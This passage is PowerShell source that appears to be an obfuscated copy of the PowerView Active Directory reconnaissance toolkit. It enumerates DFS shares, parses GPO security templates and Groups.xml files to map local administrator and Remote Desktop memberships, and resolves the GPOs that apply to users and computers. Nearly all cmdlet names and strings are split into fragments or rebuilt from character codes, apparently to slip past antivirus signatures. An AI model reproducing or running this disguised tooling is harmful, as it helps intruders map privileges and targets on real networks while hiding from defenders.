                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    (('{0}'+'siteroot') -f[Char]92) {  }
                    (('{0}d'+'omainroo'+'t'+'*')  -F [chaR]92) {
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = &('Ne'+'w-'+'Object') Guid(,$root_or_link_guid) # should match $guid_str
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    ('Na'+'me') = $blob_name
                    ('Pref'+'ix') = $prefix
                    ('Ta'+'rge'+'tList') = $target_list
                }
                $object_list += &('New-Obje'+'c'+'t') -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | &('ForEach-O'+'b'+'ject') {
                if ($_.TargetList) {
                    $_.TargetList | &('F'+'orEach'+'-'+'Obj'+'ect') {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = ('S'+'u'+'btree'),

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = &('Get-Do'+'m'+'ain'+'Searc'+'her') @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = ('(&(ob'+'ject'+'C'+'la'+'ss='+'fTDfs)'+')')

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | &('Wher'+'e-O'+'bject') {$_} | &('F'+'orEach-'+'Objec'+'t') {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | &('F'+'orE'+'ach-Ob'+'ject') {
                            try {
                                if ( $_.Contains('\') ) {
                                    &('Ne'+'w-Objec'+'t') -TypeName PSObject -Property @{('Na'+'me')=$Properties.name[0];('R'+'emot'+'eServerN'+'a'+'me')=$_.split('\')[2]}
                                }
                            }
                            catch {
                                &('W'+'rite-'+'Verbos'+'e') ('[Get'+'-D'+'omai'+'nDFSSha'+'re] '+'Get'+'-Dom'+'ainDFSSha'+'reV'+'1 '+'e'+'rr'+'or '+'i'+'n '+'p'+'arsing'+' '+'D'+'FS '+'sh'+'are '+': '+"$_")
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            &('Writ'+'e-'+'Verb'+'o'+'se') ('[Get-D'+'om'+'a'+'inDFS'+'S'+'hare]'+' '+'Ge'+'t-Do'+'mainDF'+'SSh'+'areV1 '+'erro'+'r '+'di'+'sposi'+'ng '+'of'+' '+'the'+' '+'Res'+'ult'+'s '+'obj'+'ec'+'t: '+"$_")
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        &('Pa'+'rs'+'e-Pkt') $pkt[0] | &('Fo'+'r'+'Each-Obje'+'c'+'t') {
                            if ($_ -ne ('nu'+'ll')) {
                                &('Ne'+'w-Ob'+'je'+'ct') -TypeName PSObject -Property @{('Nam'+'e')=$Properties.name[0];('Remot'+'eServ'+'er'+'Na'+'me')=$_}
                            }
                        }
                    }
                }
                catch {
                    &('W'+'ri'+'te'+'-Warni'+'ng') ('[Get-Dom'+'ainDFSSh'+'a'+'re'+'] '+'Ge'+'t-D'+'om'+'ainD'+'FSShareV'+'1 '+'err'+'or '+': '+"$_")
                }
                $DFSshares | &('So'+'rt-Obje'+'ct') -Unique -Property ('Re'+'mote'+'Serv'+'erN'+'ame')
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = ('Su'+'b'+'tree'),

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = &('Get-D'+'omainSear'+'c'+'he'+'r') @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = ('(&'+'(object'+'Cl'+'ass=ms'+'DFS'+'-Li'+'nkv2'+'))')
                $Null = $DFSSearcher.PropertiesToLoad.AddRange((('msdfs'+'-'+'link'+'pat'+'hv2'),('m'+'s'+'DFS-Target'+'Listv2')))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | &('Where-Ob'+'je'+'ct') {$_} | &('ForEa'+'c'+'h'+'-Object') {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | &('For'+'Ea'+'ch-Object') {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    &('New-Ob'+'je'+'ct') -TypeName PSObject -Property @{('N'+'ame')="$DFSroot$ShareName";('Remote'+'Ser'+'verN'+'a'+'me')=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                &('Wri'+'te'+'-Verbos'+'e') ('[Get-Do'+'main'+'DFSShare]'+' '+'Ge'+'t-DomainD'+'FSSha'+'reV'+'2 '+'err'+'or '+'i'+'n '+'p'+'a'+'rsing '+'tar'+'get '+': '+"$_")
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            &('W'+'rite-Verb'+'ose') ('[Get-Domain'+'D'+'F'+'SSh'+'ar'+'e] '+'E'+'rro'+'r '+'disp'+'os'+'in'+'g '+'of'+' '+'t'+'he '+'Re'+'sults '+'o'+'bject'+': '+"$_")
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    &('W'+'rite'+'-Warn'+'ing') ('[Get-D'+'o'+'mainDFS'+'Sh'+'a'+'re] '+'Get-Doma'+'inDFS'+'S'+'har'+'eV2 '+'erro'+'r '+': '+"$_")
                }
                $DFSshares | &('Sort'+'-Ob'+'je'+'ct') -Unique -Property ('Remo'+'teServe'+'r'+'Nam'+'e')
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters[('Dom'+'ain')]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[('Domai'+'n')] = $TargetDomain
                if ($Version -match (('allv'+'U'+'z1')-repLaCE  ([chAr]118+[chAr]85+[chAr]122),[chAr]124)) {
                    $DFSshares += &('G'+'et-'+'Doma'+'inDFS'+'Sh'+'areV1') @SearcherArguments
                }
                if ($Version -match (('a'+'ll'+'{0}2')-F  [Char]124)) {
                    $DFSshares += &('Get-Dom'+'a'+'inDF'+'S'+'ShareV2') @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match (('allOe'+'g1').rEPLace(([CHaR]79+[CHaR]101+[CHaR]103),[strINg][CHaR]124))) {
                $DFSshares += &('Get-Domai'+'nD'+'FSSh'+'areV1') @SearcherArguments
            }
            if ($Version -match (('allo'+'Ql'+'2')  -replacE 'oQl',[ChaR]124)) {
                $DFSshares += &('G'+'e'+'t-'+'Doma'+'inDFSShareV'+'2') @SearcherArguments
            }
        }

        $DFSshares | &('Sort'+'-'+'O'+'bject') -Property (('R'+'emote'+'Ser'+'verN'+'ame'),('Nam'+'e')) -Unique
    }
}



function Get-GptTmpl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'ou'+'ldP'+'roce'+'ss'), '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('gpcfiles'+'ys'+'p'+'ath'), ('Pa'+'th'))]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match (('c'+'fqcfqcfqcf'+'q.*'+'cfqcfq.'+'*').rEPLAcE(([Char]99+[Char]102+[Char]113),'\'))) -and ($PSBoundParameters[('Cr'+'e'+'den'+'tial')])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not $MappedPaths[$SysVolPath]) {
                    &('Add-Rem'+'ot'+'e'+'Connec'+'tion') -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith(('.i'+'nf'))) {
                $TargetGptTmplPath += (('{0}MAC'+'HINE{0}M'+'icro'+'soft{0'+'}'+'Window'+'s NT{'+'0}SecE'+'d'+'it{0}Gp'+'tTmpl.inf')  -f[CHar]92)
            }

            &('W'+'rit'+'e-Verb'+'ose') ('[G'+'et-'+'GptTmpl]'+' '+'Par'+'si'+'ng '+'Gpt'+'Tmpl'+'Path'+': '+"$TargetGptTmplPath")

            if ($PSBoundParameters[('Out'+'putO'+'bjec'+'t')]) {
                $Contents = &('G'+'et-Ini'+'Con'+'ten'+'t') -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | &('Ad'+'d-Me'+'mber') Noteproperty ('P'+'ath') $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = &('Get'+'-I'+'niCo'+'ntent') -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents[('Pa'+'th')] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            &('Write'+'-Ve'+'rbose') ('[Get-Gp'+'tT'+'m'+'pl] '+'E'+'rror '+'parsin'+'g '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        $MappedPaths.Keys | &('F'+'or'+'Eac'+'h'+'-Object') { &('Remo'+'ve-RemoteCon'+'n'+'ection') -Path $_ }
    }
}


function Get-GroupsXML {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SShouldPr'+'oces'+'s'), '')]
    [OutputType(('P'+'owe'+'rBl'+'a.Groups'+'XML'))]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Pa'+'th'))]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match (('uHbuHb'+'u'+'HbuH'+'b.*uH'+'buH'+'b.'+'*')  -CrePLaCe([CHar]117+[CHar]72+[CHar]98),[CHar]92)) -and ($PSBoundParameters[('Cred'+'en'+'t'+'ial')])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not $MappedPaths[$SysVolPath]) {
                    &('Add-RemoteCo'+'nnect'+'io'+'n') -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = &('Get-Cont'+'e'+'n'+'t') -Path $GroupsXMLPath -ErrorAction Stop

            $GroupsXMLcontent | &('Selec'+'t-Xm'+'l') ('/'+'Groups/'+'Group') | &('Sel'+'ect-O'+'bj'+'ect') -ExpandProperty node | &('ForE'+'ach'+'-Objec'+'t') {

                $Groupname = $_.Properties.groupName

                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match ('Ad'+'m'+'ini'+'str'+'ators')) {
                        $GroupSID = ('S'+'-1'+'-5-32-'+'544')
                    }
                    elseif ($Groupname -match ('Re'+'m'+'ote Desktop')) {
                        $GroupSID = ('S-1-5-32-'+'55'+'5')
                    }
                    elseif ($Groupname -match ('Guest'+'s')) {
                        $GroupSID = ('S-1-'+'5-'+'32-5'+'46')
                    }
                    else {
                        if ($PSBoundParameters[('Cre'+'de'+'ntia'+'l')]) {
                            $GroupSID = &('Conve'+'rt'+'To-'+'SID') -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = &('Con'+'vertTo'+'-SID') -ObjectName $Groupname
                        }
                    }
                }

                $Members = $_.Properties.members | &('S'+'el'+'ect-'+'Object') -ExpandProperty Member | &('Wh'+'e'+'re-Obj'+'ect') { $_.action -match ('AD'+'D') } | &('ForE'+'ach'+'-Ob'+'ject') {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | &('ForEa'+'ch-Objec'+'t') {
                            &('N'+'e'+'w-Obje'+'ct') -TypeName PSObject -Property @{('T'+'ype') = $_.LocalName;('Va'+'lue') = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = &('New'+'-Ob'+'ject') PSObject
                    $GroupsXML | &('Add-Me'+'mb'+'er') Noteproperty ('GPOPa'+'th') $TargetGroupsXMLPath
                    $GroupsXML | &('Add-M'+'em'+'b'+'er') Noteproperty ('Fil'+'ter'+'s') $Filters
                    $GroupsXML | &('Ad'+'d-Memb'+'er') Noteproperty ('Group'+'Na'+'me') $GroupName
                    $GroupsXML | &('Ad'+'d-Membe'+'r') Noteproperty ('Grou'+'pSID') $GroupSID
                    $GroupsXML | &('A'+'dd-Membe'+'r') Noteproperty ('Gro'+'upM'+'embe'+'r'+'Of') $Null
                    $GroupsXML | &('Add-Mem'+'be'+'r') Noteproperty ('Grou'+'pM'+'e'+'mbers') $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, ('P'+'owe'+'rBl'+'a'+'.GroupsXM'+'L'))
                    $GroupsXML
                }
            }
        }
        catch {
            &('W'+'rite'+'-Verbose') ('[Get-G'+'ro'+'u'+'psXML] '+'Error'+' '+'pars'+'ing'+' '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        $MappedPaths.Keys | &('Fo'+'r'+'E'+'ach-'+'Object') { &('Remove'+'-'+'R'+'emo'+'t'+'eC'+'onnec'+'tion') -Path $_ }
    }
}


function Get-DomainGPO {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShouldP'+'r'+'oc'+'ess'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'UseDecl'+'aredVars'+'MoreThanAssi'+'gnme'+'nts'), '')]
    [OutputType(('P'+'ow'+'erBla.GPO'))]
    [OutputType(('Powe'+'rBla.GPO.'+'Ra'+'w'))]
    [CmdletBinding(DefaultParameterSetName = {'Non'+'e'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('D'+'ist'+'ingu'+'ishedN'+'ame'), ('Sa'+'mAc'+'countName'), ('Na'+'me'))]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = "CO`MPuT`e`RId`en`TItY")]
        [Alias(('C'+'om'+'put'+'erName'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = "U`s`eRid`ENtiTY")]
        [Alias(('Use'+'rN'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilt'+'er'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainCo'+'n'+'tro'+'ller'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('OneLeve'+'l'), ('S'+'ubtree'))]
        [String]
        $SearchScope = ('Su'+'btre'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('D'+'acl'), ('Gro'+'up'), ('N'+'one'), ('Owne'+'r'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('Re'+'tu'+'rn'+'One'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('D'+'omain')]) { $SearcherArguments[('Domai'+'n')] = $Domain }
        if ($PSBoundParameters[('Prope'+'rtie'+'s')]) { $SearcherArguments[('Prop'+'erti'+'e'+'s')] = $Properties }
        if ($PSBoundParameters[('SearchBa'+'s'+'e')]) { $SearcherArguments[('Se'+'a'+'rchBas'+'e')] = $SearchBase }
        if ($PSBoundParameters[('S'+'erver')]) { $SearcherArguments[('Se'+'rv'+'er')] = $Server }
        if ($PSBoundParameters[('Sear'+'ch'+'Sc'+'ope')]) { $SearcherArguments[('Sear'+'ch'+'Sc'+'ope')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'u'+'lt'+'PageSi'+'ze')]) { $SearcherArguments[('R'+'esult'+'Pa'+'geSi'+'ze')] = $ResultPageSize }
        if ($PSBoundParameters[('Serv'+'erTim'+'eLim'+'i'+'t')]) { $SearcherArguments[('Ser'+'ver'+'TimeLim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('S'+'ecuri'+'tyMasks')]) { $SearcherArguments[('SecurityM'+'as'+'ks')] = $SecurityMasks }
        if ($PSBoundParameters[('Tom'+'b'+'stone')]) { $SearcherArguments[('Tombst'+'on'+'e')] = $Tombstone }
        if ($PSBoundParameters[('C'+'rede'+'ntial')]) { $SearcherArguments[('Cred'+'enti'+'a'+'l')] = $Credential }
        $GPOSearcher = &('G'+'et-Doma'+'in'+'Searcher') @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters[('Comp'+'uterIden'+'t'+'ity')] -or $PSBoundParameters[('U'+'serIdent'+'it'+'y')]) {
                $GPOAdsPaths = @()
                if ($SearcherArguments[('Pr'+'o'+'pert'+'ies')]) {
                    $OldProperties = $SearcherArguments[('Proper'+'t'+'ie'+'s')]
                }
                $SearcherArguments[('Prope'+'r'+'ties')] = ('distingui'+'sh'+'edname,dn'+'sh'+'ostnam'+'e')
                $TargetComputerName = $Null

                if ($PSBoundParameters[('Comp'+'u'+'terId'+'ent'+'ity')]) {
                    $SearcherArguments[('Ident'+'ity')] = $ComputerIdentity
                    $Computer = &('Get-Doma'+'in'+'Comput'+'e'+'r') @SearcherArguments -FindOne | &('S'+'e'+'lect'+'-'+'Object') -First 1
                    if(-not $Computer) {
                        &('Wri'+'te-Verb'+'os'+'e') ('['+'Get-Doma'+'in'+'G'+'PO] '+'Co'+'mputer'+' '+"'$ComputerIdentity' "+'n'+'ot '+'fo'+'u'+'nd!')
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments[('Identi'+'ty')] = $UserIdentity
                    $User = &('Get'+'-Dom'+'ainUser') @SearcherArguments -FindOne | &('Se'+'lect-Ob'+'ject') -First 1
                    if(-not $User) {
                        &('W'+'rite-'+'Ver'+'bose') ('['+'Ge'+'t-D'+'omainG'+'PO] '+'U'+'ser '+"'$UserIdentity' "+'n'+'ot '+'found'+'!')
                    }
                    $ObjectDN = $User.distinguishedname
                }

                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | &('For'+'E'+'ach-Ob'+'je'+'ct') {
                    if($_.startswith(('OU'+'='))) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                &('W'+'ri'+'te-Verbo'+'se') ('[Get-D'+'om'+'a'+'inGPO'+'] '+'o'+'bjec'+'t '+'O'+'Us: '+"$ObjectOUs")

                if ($ObjectOUs) {
                    $SearcherArguments.Remove(('Prop'+'ertie'+'s'))
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments[('Ident'+'ity')] = $ObjectOU
                        $GPOAdsPaths += &('G'+'et'+'-DomainO'+'U') @SearcherArguments | &('Fo'+'rEa'+'ch-Obje'+'c'+'t') {
                            if ($_.gplink) {
                                $_.gplink.split('][') | &('ForEach-'+'Obj'+'ec'+'t') {
                                    if ($_.startswith(('LDA'+'P'))) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    $ComputerSite = (&('Get-NetCom'+'puter'+'Sit'+'e'+'N'+'ame') -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike ('Er'+'ror'+'*'))) {
                        $SearcherArguments[('I'+'d'+'entity')] = $ComputerSite
                        $GPOAdsPaths += &('Get-D'+'omain'+'Site') @SearcherArguments | &('ForEa'+'ch-Obje'+'c'+'t') {
                            if($_.gplink) {
                                $_.gplink.split('][') | &('F'+'orEa'+'ch-Object') {
                                    if ($_.startswith(('L'+'DAP'))) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf(('D'+'C=')))
                $SearcherArguments.Remove(('Ide'+'nt'+'ity'))
                $SearcherArguments.Remove(('Prop'+'erti'+'es'))
                $SearcherArguments[('LDAPF'+'il'+'ter')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += &('Ge'+'t-Doma'+'inO'+'bject') @SearcherArguments | &('For'+'Each'+'-Object') {
                    if($_.gplink) {
                        $_.gplink.split('][') | &('ForEa'+'ch-O'+'bje'+'c'+'t') {
                            if ($_.startswith(('LDA'+'P'))) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                &('Wri'+'te-Ver'+'bose') ('[Ge'+'t-Dom'+'ainG'+'PO]'+' '+'GPOAdsPat'+'h'+'s'+': '+"$GPOAdsPaths")

                if ($OldProperties) { $SearcherArguments[('Pr'+'ope'+'rties')] = $OldProperties }
                else { $SearcherArguments.Remove(('P'+'ropertie'+'s')) }
                $SearcherArguments.Remove(('Id'+'entity'))

                $GPOAdsPaths | &('Where-Ob'+'je'+'ct') {$_ -and ($_ -ne '')} | &('ForE'+'ac'+'h-Object') {
                    $SearcherArguments[('S'+'earch'+'Base')] = $_
                    $SearcherArguments[('LDAPF'+'ilte'+'r')] = ('(o'+'b'+'j'+'ect'+'Category'+'=groupP'+'olicyC'+'on'+'tainer)')
                    &('Get-Domai'+'nOb'+'je'+'c'+'t') @SearcherArguments | &('For'+'Each-Obj'+'ect') {
                        if ($PSBoundParameters[('Ra'+'w')]) {
                            $_.PSObject.TypeNames.Insert(0, ('P'+'o'+'werBla.GPO.'+'Raw'))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, ('PowerB'+'la'+'.G'+'PO'))
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | &('Wh'+'e'+'re-O'+'bject') {$_} | &('For'+'Each-'+'Obje'+'ct') {
                    $IdentityInstance = $_.Replace('(', (('XGK28') -rePlACE ([cHaR]88+[cHaR]71+[cHaR]75),[cHaR]92)).Replace(')', (('y0q2'+'9')  -ReplACe  'y0q',[CHAR]92))
